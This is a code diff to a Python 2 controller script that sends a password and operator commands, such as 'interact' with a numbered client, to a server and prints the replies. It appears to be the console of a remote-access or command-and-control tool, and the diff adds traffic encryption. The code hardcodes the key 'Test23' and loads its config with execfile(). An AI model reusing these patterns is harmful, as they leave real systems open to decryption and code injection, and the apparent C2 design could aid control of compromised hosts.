@@ -11,6 +11,8 @@ import threading
 import time
 from socket import *
 
+from encryption import *
+
 config = {}
 execfile("Control.conf", config) 	
 	
@@ -25,6 +27,7 @@ class control():
 
 		login = {'password': args.password}
 		login = json.dumps(login)
+		login = encryption().encrypt(login, "Test23")
 		s.send(login)
 
 		while True:
@@ -38,21 +41,24 @@ class control():
 				elif("interact" in command):
 					answers = command.split(' ')
 					if len(answers) == 1:
-						client = raw_input(" [#] Client Number:")
+						client = raw_input(" [?] Client Number:")
 						Cmd = {"command": command, "client":client}
-					else:
-						Cmd = {"command": answers[0], "client":answers[1]} 
+					else: Cmd = {"command": answers[0], "client":answers[1]} 
 					Cmd = json.dumps(Cmd)
+					Cmd = encryption().encrypt(Cmd, "Test23")
 					s.send(Cmd)
 					reply = s.recv(20480)
+					reply = encryption().decrypt(reply, "Test23")
 					Reply = Decode().process(reply)
 					print str(Reply)
 
 				else:
 					Cmd = {'command': command}
 					Cmd = json.dumps(Cmd)
+					Cmd = encryption().encrypt(Cmd, "Test23")
 					s.send(Cmd)
 					reply = s.recv(20480)
+					reply = encryption().decrypt(reply, "Test23")
 					Reply = Decode().process(reply)
 					print str(Reply)
 
